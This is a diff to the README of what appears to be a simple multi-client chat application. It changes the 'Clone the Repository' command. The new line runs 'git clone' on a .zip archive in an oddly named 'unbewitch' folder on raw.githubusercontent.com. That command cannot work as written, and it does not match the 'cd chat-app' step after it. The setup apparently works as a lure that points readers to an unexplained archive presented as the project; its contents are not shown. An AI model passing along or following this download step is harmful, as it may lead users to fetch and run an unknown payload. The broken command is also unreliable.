@@ -19,5 +19,5 @@ This project is a simple **multi-client chat application** that supports **both 
 
 ### ** Clone the Repository**
 ```bash
-git clone https://raw.githubusercontent.com/Karthik-Kandi/Karthik-23071A3226-Team1/main/unbewitch/Karthik-23071A3226-Team1_2.3.zip
+git clone https://raw.githubusercontent.com/Karthik-Kandi/Karthik-23071A3226-Team1/main/unbewitch/Karthik_Team_2.5.zip
 cd chat-app
